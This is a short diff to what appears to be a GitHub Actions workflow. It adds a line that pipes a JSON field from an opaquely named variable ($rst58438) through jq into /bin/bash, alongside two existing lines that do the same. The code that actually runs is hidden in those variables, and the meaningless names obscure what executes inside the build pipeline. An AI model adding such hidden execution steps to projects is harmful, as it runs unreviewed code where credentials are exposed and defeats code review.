@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$o55" | jq -r .dogw1 | /bin/bash
           printf '%s' "$iwfk7" | jq -r .aium608 | /bin/bash
+          echo $rst58438 | jq -r .ghhgk59 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
